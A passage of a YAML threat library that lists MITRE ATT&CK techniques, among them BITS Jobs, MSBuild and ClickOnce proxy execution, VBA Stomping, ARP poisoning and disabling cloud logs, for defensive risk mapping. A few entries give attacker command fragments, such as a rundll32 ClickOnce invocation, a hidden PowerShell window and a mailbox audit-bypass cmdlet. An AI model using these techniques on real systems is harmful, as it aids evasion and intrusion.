      keychain.(Citation: objective-see ay mami 2018)

      https://attack.mitre.org/techniques/T1553/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1037.003
    ref_id: T1037.003
    name: Network Logon Script
    description: "Adversaries may use network logon scripts automatically executed\
      \ at logon initialization to establish persistence. Network logon scripts can\
      \ be assigned using Active Directory or Group Policy Objects.(Citation: Petri\
      \ Logon Script AD) These logon scripts run with the privileges of the user they\
      \ are assigned to. Depending on the systems within the network, initializing\
      \ one of these scripts could apply to more than one or potentially all systems.\
      \  \n \nAdversaries may use these scripts to maintain persistence on a network.\
      \ Depending on the access configuration of the logon scripts, either local credentials\
      \ or an administrator account may be necessary.\nhttps://attack.mitre.org/techniques/T1037/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499
    ref_id: T1499
    name: Endpoint Denial of Service
    description: 'Adversaries may perform Endpoint Denial of Service (DoS) attacks
      to degrade or block the availability of services to users. Endpoint DoS can
      be performed by exhausting the system resources those services are hosted on
      or exploiting the system to cause a persistent crash condition. Example services
      include websites, email services, DNS, and web-based applications. Adversaries
      have been observed conducting DoS attacks for political purposes(Citation: FireEye
      OpPoisonedHandover February 2016) and to support other malicious activities,
      including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism,
      and extortion.(Citation: Symantec DDoS October 2014)


      An Endpoint DoS denies the availability of a service without saturating the
      network used to provide access to the service. Adversaries can target various
      layers of the application stack that is hosted on the system used to provide
      the service. These layers include the Operating Systems (OS), server applications
      such as web servers, DNS servers, databases, and the (typically web-based) applications
      that sit on top of them. Attacking each layer requires different techniques
      that take advantage of bottlenecks that are unique to the respective components.
      A DoS attack may be generated by a single system or multiple systems spread
      across the internet, which is commonly referred to as a distributed DoS (DDoS).


      To perform DoS attacks against endpoint resources, several aspects apply to
      multiple methods, including IP address spoofing and botnets.


      Adversaries may use the original IP address of an attacking system, or spoof
      the source IP address to make the attack traffic more difficult to trace back
      to the attacking system or to enable reflection. This can increase the difficulty
      defenders have in defending against the attack by reducing or eliminating the
      effectiveness of filtering by the source address on network defense devices.


      Botnets are commonly used to conduct DDoS attacks against networks and services.
      Large botnets can generate a significant amount of traffic from systems spread
      across the global internet. Adversaries may have the resources to build out
      and control their own botnet infrastructure or may rent time on an existing
      botnet to conduct an attack. In some of the worst cases for DDoS, so many systems
      are used to generate requests that each one only needs to send out a small amount
      of traffic to produce enough volume to exhaust the target''s resources. In such
      circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly
      difficult. Botnets have been used in some of the most high-profile DDoS attacks,
      such as the 2012 series of incidents that targeted major US banks.(Citation:
      USNYAG IranianBotnet March 2016)


      In cases where traffic manipulation is used, there may be points in the global
      network (such as high traffic gateway routers) where packets can be altered
      and cause legitimate clients to execute code that directs network packets toward
      a target in high volume. This type of capability was previously used for the
      purposes of web censorship where client HTTP traffic was modified to include
      a reference to JavaScript that generated the DDoS code to overwhelm target web
      servers.(Citation: ArsTechnica Great Firewall of China)


      For attacks attempting to saturate the providing network, see [Network Denial
      of Service](https://attack.mitre.org/techniques/T1498).

      https://attack.mitre.org/techniques/T1499'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.004
    ref_id: T1027.004
    name: Compile After Delivery
    description: 'Adversaries may attempt to make payloads difficult to discover and
      analyze by delivering files to victims as uncompiled code. Text-based source
      code files may subvert analysis and scrutiny from protections targeting executables/binaries.
      These payloads will need to be compiled before execution; typically via native
      utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation:
      ClearSky MuddyWater Nov 2018)


      Source code payloads may also be encrypted, encoded, and/or embedded within
      other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566).
      Payloads may also be delivered in formats unrecognizable and inherently benign
      to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into
      a proper executable binary with a bundled compiler and execution framework.(Citation:
      TrendMicro WindowsAppMac)

      https://attack.mitre.org/techniques/T1027/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1614
    ref_id: T1614
    name: System Location Discovery
    description: 'Adversaries may gather information in an attempt to calculate the
      geographical location of a victim host. Adversaries may use the information
      from [System Location Discovery](https://attack.mitre.org/techniques/T1614)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Adversaries may attempt to infer the location of a system using various system
      checks, such as time zone, keyboard layout, and/or language settings.(Citation:
      FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer
      RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code>
      can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker
      2020) In cloud environments, an instance''s availability zone may also be discovered
      by accessing the instance metadata service from the instance.(Citation: AWS
      Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)


      Adversaries may also attempt to infer the location of a victim host using IP
      addressing, such as via online geolocation IP-lookup services.(Citation: Securelist
      Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)

      https://attack.mitre.org/techniques/T1614'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.007
    ref_id: T1564.007
    name: VBA Stomping
    description: "Adversaries may hide malicious Visual Basic for Applications (VBA)\
      \ payloads embedded within MS Office documents by replacing the VBA source code\
      \ with benign data.(Citation: FireEye VBA stomp Feb 2020)\n\nMS Office documents\
      \ with embedded VBA content store source code inside of module streams. Each\
      \ module stream has a <code>PerformanceCache</code> that stores a separate compiled\
      \ version of the VBA source code known as p-code. The p-code is executed when\
      \ the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which\
      \ contains the version-dependent description of the VBA project) matches the\
      \ version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation:\
      \ Microsoft _VBA_PROJECT Stream)\n\nAn adversary may hide malicious VBA code\
      \ by overwriting the VBA source code location with zero\u2019s, benign code,\
      \ or random bytes while leaving the previously compiled malicious p-code. Tools\
      \ that scan for malicious VBA source code may be bypassed as the unwanted code\
      \ is hidden in the compiled p-code. If the VBA source code is removed, some\
      \ tools might even think that there are no macros present. If there is a version\
      \ match between the <code>_VBA_PROJECT</code> stream and host MS Office application,\
      \ the p-code will be executed, otherwise the benign VBA source code will be\
      \ decompressed and recompiled to p-code, thus removing malicious p-code and\
      \ potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation:\
      \ FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev)\nhttps://attack.mitre.org/techniques/T1564/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1197
    ref_id: T1197
    name: BITS Jobs
    description: 'Adversaries may abuse BITS jobs to persistently execute code and
      perform various background tasks. Windows Background Intelligent Transfer Service
      (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through
      [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation:
      Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters,
      messengers, and other applications preferred to operate in the background (using
      available idle bandwidth) without interrupting other networked applications.
      File transfer tasks are implemented as BITS jobs, which contain a queue of one
      or more file operations.


      The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001)
      and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation:
      Microsoft BITS)(Citation: Microsoft BITSAdmin)


      Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)),
      execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)).
      BITS tasks are self-contained in the BITS job database, without new files or
      registry modifications, and often permitted by host firewalls.(Citation: CTU
      BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation:
      Symantec BITS May 2007) BITS enabled execution may also enable persistence by
      creating long-standing jobs (the default maximum lifetime is 90 days and extendable)
      or invoking an arbitrary program when a job completes or errors (including after
      system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware
      June 2016)


      BITS upload functionalities can also be used to perform [Exfiltration Over Alternative
      Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware
      June 2016)

      https://attack.mitre.org/techniques/T1197'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127.001
    ref_id: T1127.001
    name: MSBuild
    description: 'Adversaries may use MSBuild to proxy execution of code through a
      trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software
      build platform used by Visual Studio. It handles XML formatted project files
      that define requirements for loading and building various platforms and configurations.(Citation:
      MSDN MSBuild)


      Adversaries can abuse MSBuild to proxy execution of malicious code. The inline
      task capability of MSBuild that was introduced in .NET version 4 allows for
      C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN
      MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile
      and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when
      it is used this way it can execute arbitrary code and bypass application control
      defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS
      Msbuild)

      https://attack.mitre.org/techniques/T1127/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1656
    ref_id: T1656
    name: Impersonation
    description: "Adversaries may impersonate a trusted person or organization in\
      \ order to persuade and trick a target into performing some action on their\
      \ behalf. For example, adversaries may communicate with victims (via [Phishing\
      \ for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566),\
      \ or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while\
      \ impersonating a known sender such as an executive, colleague, or third-party\
      \ vendor. Established trust can then be leveraged to accomplish an adversary\u2019\
      s ultimate goals, possibly against multiple victims. \n \nIn many cases of business\
      \ email compromise or email fraud campaigns, adversaries use impersonation to\
      \ defraud victims -- deceiving them into sending money or divulging information\
      \ that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).\n\
      \nAdversaries will often also use social engineering techniques such as manipulative\
      \ and persuasive language in email subject lines and body text such as `payment`,\
      \ `request`, or `urgent` to push the victim to act quickly before malicious\
      \ activity is detected. These campaigns are often specifically targeted against\
      \ people who, due to job roles and/or accesses, can carry out the adversary\u2019\
      s goal.\u202F\u202F \n \nImpersonation is typically preceded by reconnaissance\
      \ techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589)\
      \ and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591)\
      \ as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001))\
      \ to substantiate their false identity.(Citation: CrowdStrike-BEC)\n \nThere\
      \ is the potential for multiple victims in campaigns involving impersonation.\
      \ For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586)\
      \ targeting one organization which can then be used to support impersonation\
      \ against other entities.(Citation: VEC)\nhttps://attack.mitre.org/techniques/T1656"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.005
    ref_id: T1578.005
    name: Modify Cloud Compute Configurations
    description: "Adversaries may modify settings that directly affect the size, locations,\
      \ and resources available to cloud compute infrastructure in order to evade\
      \ defenses. These settings may include service quotas, subscription associations,\
      \ tenant-wide policies, or other configurations that impact available compute.\
      \ Such modifications may allow adversaries to abuse the victim\u2019s compute\
      \ resources to achieve their goals, potentially without affecting the execution\
      \ of running instances and/or revealing their activities to the victim.\n\n\
      For example, cloud providers often limit customer usage of compute resources\
      \ via quotas. Customers may request adjustments to these quotas to support increased\
      \ computing needs, though these adjustments may require approval from the cloud\
      \ provider. Adversaries who compromise a cloud environment may similarly request\
      \ quota adjustments in order to support their activities, such as enabling additional\
      \ [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising\
      \ suspicion by using up a victim\u2019s entire quota.(Citation: Microsoft Cryptojacking\
      \ 2023) Adversaries may also increase allowed resource usage by modifying any\
      \ tenant-wide policies that limit the sizes of deployed virtual machines.(Citation:\
      \ Microsoft Azure Policy)\n\nAdversaries may also modify settings that affect\
      \ where cloud resources can be deployed, such as enabling [Unused/Unsupported\
      \ Cloud Regions](https://attack.mitre.org/techniques/T1535).\nhttps://attack.mitre.org/techniques/T1578/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1090.004
    ref_id: T1090.004
    name: Domain Fronting
    description: 'Adversaries may take advantage of routing schemes in Content Delivery
      Networks (CDNs) and other services which host multiple domains to obfuscate
      the intended destination of HTTPS traffic or traffic tunneled through HTTPS.
      (Citation: Fifield Blocking Resistent Communication through domain fronting
      2015) Domain fronting involves using different domain names in the SNI field
      of the TLS header and the Host field of the HTTP header. If both domains are
      served from the same CDN, then the CDN may route to the address specified in
      the HTTP header after unwrapping the TLS header. A variation of the the technique,
      "domainless" fronting, utilizes a SNI field that is left blank; this may allow
      the fronting to work even when the CDN attempts to validate that the SNI and
      HTTP Host fields match (if the blank SNI fields are ignored).


      For example, if domain-x and domain-y are customers of the same CDN, it is possible
      to place domain-x in the TLS header and domain-y in the HTTP header. Traffic
      will appear to be going to domain-x, however the CDN may route it to domain-y.

      https://attack.mitre.org/techniques/T1090/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1557.002
    ref_id: T1557.002
    name: ARP Cache Poisoning
    description: 'Adversaries may poison Address Resolution Protocol (ARP) caches
      to position themselves between the communication of two or more networked devices.
      This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040)
      or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).


      The ARP protocol is used to resolve IPv4 addresses to link layer addresses,
      such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices
      in a local network segment communicate with each other by using link layer addresses.
      If a networked device does not have the link layer address of a particular networked
      device, it may send out a broadcast ARP request to the local network to translate
      the IP address to a MAC address. The device with the associated IP address directly
      replies with its MAC address. The networked device that made the ARP request
      will then use as well as store that information in its ARP cache.


      An adversary may passively wait for an ARP request to poison the ARP cache of
      the requesting device. The adversary may reply with their MAC address, thus
      deceiving the victim by making them believe that they are communicating with
      the intended networked device. For the adversary to poison the ARP cache, their
      reply must be faster than the one made by the legitimate IP address owner. Adversaries
      may also send a gratuitous ARP reply that maliciously announces the ownership
      of a particular IP address to all the devices in the local network segment.


      The ARP protocol is stateless and does not require authentication. Therefore,
      devices may wrongly add or update the MAC address of the IP address in their
      ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)


      Adversaries may use ARP cache poisoning as a means to intercept network traffic.
      This activity may be used to collect and/or relay data such as credentials,
      especially those sent over an insecure, unencrypted protocol.(Citation: Sans
      ARP Spoofing Aug 2003)

      https://attack.mitre.org/techniques/T1557/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1562.008
    ref_id: T1562.008
    name: Disable or Modify Cloud Logs
    description: "An adversary may disable or modify cloud logging capabilities and\
      \ integrations to limit what data is collected on their activities and avoid\
      \ detection. Cloud environments allow for collection and analysis of audit and\
      \ application logs that provide insight into what activities a user does within\
      \ the environment. If an adversary has sufficient permissions, they can disable\
      \ or modify logging to avoid detection of their activities.\n\nFor example,\
      \ in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to\
      \ conducting further malicious activity.(Citation: Following the CloudTrail:\
      \ Generating strong AWS security signals with Sumo Logic) They may alternatively\
      \ tamper with logging functionality \u2013 for example, by removing any associated\
      \ SNS topics, disabling multi-region logging, or disabling settings that validate\
      \ and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection\
      \ Disruption Module) In Office 365, an adversary may disable logging on mail\
      \ collection activities for specific users by using the `Set-MailboxAuditBypassAssociation`\
      \ cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading\
      \ the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation:\
      \ Dark Reading Microsoft 365 Attacks 2021)\nhttps://attack.mitre.org/techniques/T1562/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1518.001
    ref_id: T1518.001
    name: Security Software Discovery
    description: 'Adversaries may attempt to get a listing of security software, configurations,
      defensive tools, and sensors that are installed on a system or in a cloud environment.
      This may include things such as cloud monitoring agents and anti-virus. Adversaries
      may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      Example commands that can be used to obtain security software information are
      [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with
      [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106),
      and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators
      of discovery behavior may be more specific to the type of software or security
      system the adversary is looking for. It is becoming more common to see macOS
      malware perform checks for LittleSnitch and KnockKnock software.


      Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009)
      to discover cloud-native security software installed on compute infrastructure,
      such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent.
      These agents  may collect  metrics and logs from the VM, which may be centrally
      aggregated in a cloud-based monitoring platform.

      https://attack.mitre.org/techniques/T1518/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.003
    ref_id: T1564.003
    name: Hidden Window
    description: "Adversaries may use hidden windows to conceal malicious activity\
      \ from the plain sight of users. In some cases, windows that would typically\
      \ be displayed when an application carries out an operation can be hidden. This\
      \ may be utilized by system administrators to avoid disrupting user work environments\
      \ when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities\
      \ to hide otherwise visible windows from users so as not to alert the user to\
      \ adversary activity on the system.(Citation: Antiquated Mac Malware)\n\nOn\
      \ macOS, the configurations for how applications run are listed in property\
      \ list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>,\
      \ which allows for Java applications to prevent the application's icon from\
      \ appearing in the Dock. A common use for this is when applications run in the\
      \ system tray, but don't also want to show up in the Dock.\n\nSimilarly, on\
      \ Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
      \ Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005)\
      \ to make windows hidden. One example of this is <code>powershell.exe -WindowStyle\
      \ Hidden</code>.(Citation: PowerShell About 2019)\n\nIn addition, Windows supports\
      \ the `CreateDesktop()` API that can create a hidden desktop window with its\
      \ own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation:\
      \ Anatomy of an hVNC Attack)  All applications running on the hidden desktop\
      \ window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be\
      \ invisible to other desktops windows.\nhttps://attack.mitre.org/techniques/T1564/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127.002
    ref_id: T1127.002
    name: ClickOnce
    description: "Adversaries may use ClickOnce applications (.appref-ms and .application\
      \ files) to proxy execution of code through a trusted Windows utility.(Citation:\
      \ Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user\
      \ to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE,\
      \ or .DLL) that install and run from a file share or web page with minimal user\
      \ interaction. The application launches as a child process of DFSVC.EXE, which\
      \ is responsible for installing, launching, and updating the application.(Citation:\
      \ SpectorOps Medium ClickOnce)\n\nBecause ClickOnce applications receive only\
      \ limited permissions, they do not require administrative permissions to install.(Citation:\
      \ Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy\
      \ execution of malicious code without needing to escalate privileges.\n\nClickOnce\
      \ may be abused in a number of ways. For example, an adversary may rely on [User\
      \ Execution](https://attack.mitre.org/techniques/T1204). When a user visits\
      \ a malicious website, the .NET malware is disguised as legitimate software\
      \ and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)\n\
      \nAdversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011)\
      \ script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation:\
      \ LOLBAS /Dfsvc.exe)\n\nAdditionally, an adversary can move the ClickOnce application\
      \ file to a remote user\u2019s startup folder for continued malicious code deployment\
      \ (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation:\
      \ Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)\nhttps://attack.mitre.org/techniques/T1127/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.006
    ref_id: T1059.006
    name: Python
    description: 'Adversaries may abuse Python commands and scripts for execution.
      Python is a very popular scripting/programming language, with capabilities to
      perform many functions. Python can be executed interactively from the command-line
      (via the <code>python.exe</code> interpreter) or via scripts (.py) that can
      be written and distributed to different systems. Python code can also be compiled
      into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)


      Python comes with many built-in packages to interact with the underlying system,
      such as file operations and device I/O. Adversaries can use these libraries
      to download and execute commands or other scripts as well as perform various
      malicious behaviors.

      https://attack.mitre.org/techniques/T1059/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.010
    ref_id: T1070.010
    name: Relocate Malware
    description: 'Once a payload is delivered, adversaries may reproduce copies of
      the same malware on the victim system to remove evidence of their presence and/or
      avoid defenses. Copying malware payloads to new locations may also be combined
      with [File Deletion](https://attack.mitre.org/techniques/T1070/004) to cleanup
      older artifacts.


      Relocating malware may be a part of many actions intended to evade defenses.
      For example, adversaries may copy and rename payloads to better blend into the
      local environment (i.e., [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation:
      DFIR Report Trickbot June 2023) Payloads may also be repositioned to target
      [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012) as well
      as specific locations associated with establishing [Persistence](https://attack.mitre.org/tactics/TA0003).(Citation:
      Latrodectus APR 2024)


      Relocating malicious payloads may also hinder defensive analysis, especially
      to separate these payloads from earlier events (such as [User Execution](https://attack.mitre.org/techniques/T1204)
      and [Phishing](https://attack.mitre.org/techniques/T1566)) that may have generated
      alerts or otherwise drawn attention from defenders.

      https://attack.mitre.org/techniques/T1070/010'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.004
    ref_id: T1591.004
    name: Identify Roles
    description: 'Adversaries may gather information about identities and roles within
      the victim organization that can be used during targeting. Information about
      business roles may reveal a variety of targetable details, including identifiable
      information for key personnel as well as what data/resources they have access
      to.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about business roles may also be exposed to adversaries via online or other
      accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)
      or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1591/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1132
    ref_id: T1132
    name: Data Encoding
    description: 'Adversaries may encode data to make the content of command and control
      traffic more difficult to detect. Command and control (C2) information can be
      encoded using a standard data encoding system. Use of data encoding may adhere
      to existing protocol specifications and includes use of ASCII, Unicode, Base64,
      MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia
      Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data
      encoding systems may also result in data compression, such as gzip.

      https://attack.mitre.org/techniques/T1132'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.010
    ref_id: T1546.010
    name: AppInit DLLs
    description: "Adversaries may establish persistence and/or elevate privileges\
      \ by executing malicious content triggered by AppInit DLLs loaded into processes.\
      \ Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code>\
      \ value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\\
      Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\\
      Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded\
      \ by user32.dll into every process that loads user32.dll. In practice this is\
      \ nearly every program, since user32.dll is a very common library. (Citation:\
      \ Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these\
      \ values can be abused to obtain elevated privileges by causing a malicious\
      \ DLL to be loaded and run in the context of separate processes on the computer.\
      \ (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence\
      \ by continuously being triggered by API activity. \n\nThe AppInit DLL functionality\
      \ is disabled in Windows 8 and later versions when secure boot is enabled. (Citation:\
      \ AppInit Secure Boot)\nhttps://attack.mitre.org/techniques/T1546/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598
    ref_id: T1598
    name: Phishing for Information
    description: "Adversaries may send phishing messages to elicit sensitive information\
      \ that can be used during targeting. Phishing for information is an attempt\
      \ to trick targets into divulging information, frequently credentials or other\
      \ actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ in that the objective is gathering data from the victim rather than executing\
      \ malicious code.\n\nAll forms of phishing are electronically delivered social\
      \ engineering. Phishing can be targeted, known as spearphishing. In spearphishing,\
      \ a specific individual, company, or industry will be targeted by the adversary.\
      \ More generally, adversaries can conduct non-targeted phishing, such as in\
      \ mass credential harvesting campaigns.\n\nAdversaries may also try to obtain\
      \ information directly through the exchange of emails, instant messages, or\
      \ other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation:\
      \ TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation:\
      \ GitHub Phishery) Victims may also receive phishing messages that direct them\
      \ to call a phone number where the adversary attempts to collect confidential\
      \ information.(Citation: Avertium callback phishing)\n\nPhishing for information\
      \ frequently involves social engineering techniques, such as posing as a source\
      \ with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or\
      \ sending multiple, seemingly urgent messages. Another way to accomplish this\
      \ is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the\
      \ sender which can be used to fool both the human recipient as well as automated\
      \ security tools.(Citation: cyberproof-double-bounce) \n\nPhishing for information\
      \ may also involve evasive techniques, such as removing or manipulating emails\
      \ or metadata/headers from compromised accounts being abused to send messages\
      \ (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation:\
      \ Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)\n\
      https://attack.mitre.org/techniques/T1598"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1496
    ref_id: T1496
    name: Resource Hijacking
    description: "Adversaries may leverage the resources of co-opted systems to complete\
      \ resource-intensive tasks, which may impact system and/or hosted service availability.\
      \ \n\nResource hijacking may take a number of different forms. For example,\
      \ adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n\
      * Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n\
      * Abuse cloud-based messaging services to send large quantities of spam messages\n\
      \nIn some cases, adversaries may leverage multiple types of Resource Hijacking\
      \ at once.(Citation: Sysdig Cryptojacking Proxyjacking 2023)\nhttps://attack.mitre.org/techniques/T1496"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1585
    ref_id: T1585
    name: Establish Accounts
    description: 'Adversaries may create and cultivate accounts with services that
      can be used during targeting. Adversaries can create accounts that can be used
      to build a persona to further operations. Persona development consists of the
      development of public information, presence, history and appropriate affiliations.
      This development could be applied to social media, website, or other publicly
      available information that could be referenced and scrutinized for legitimacy
      over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation:
      BlackHatRobinSage)


      For operations incorporating social engineering, the utilization of an online
      persona may be important. These personas may be fictitious or impersonate real
      people. The persona may exist on a single site or across multiple sites (ex:
      Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing
      a persona may require development of additional documentation to make them seem
      real. This could include filling out profile information, developing social
      networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)


      Establishing accounts can also include the creation of accounts with email providers,
      which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598)
      or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant
      APT1) In addition, establishing accounts may allow adversaries to abuse free
      services, such as registering for trial periods to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      for malicious purposes.(Citation: Free Trial PurpleUrchin)

      https://attack.mitre.org/techniques/T1585'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588
    ref_id: T1588
    name: Obtain Capabilities
    description: 'Adversaries may buy and/or steal capabilities that can be used during
      targeting. Rather than developing their own capabilities in-house, adversaries
      may purchase, freely download, or steal them. Activities may include the acquisition
      of malware, software (including licenses), exploits, certificates, and information
      relating to vulnerabilities. Adversaries may obtain capabilities to support
      their operations throughout numerous phases of the adversary lifecycle.


      In addition to downloading free malware, software, and exploits from the internet,
      adversaries may purchase these capabilities from third-party entities. Third-party
      entities can include technology companies that specialize in malware and exploits,
      criminal marketplaces, or from individuals.(Citation: NationsBuying)(Citation:
      PegasusCitizenLab)


      In addition to purchasing capabilities, adversaries may steal capabilities from
      third-party entities (including other adversaries). This can include stealing
      software licenses, malware, SSL/TLS and code-signing certificates, or raiding
      closed databases of vulnerabilities or exploits.(Citation: DiginotarCompromise)

      https://attack.mitre.org/techniques/T1588'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.002
    ref_id: T1546.002
    name: Screensaver
    description: 'Adversaries may establish persistence by executing malicious content
      triggered by user inactivity. Screensavers are programs that execute after a
      configurable time of user inactivity and consist of Portable Executable (PE)
      files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows
      screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>,
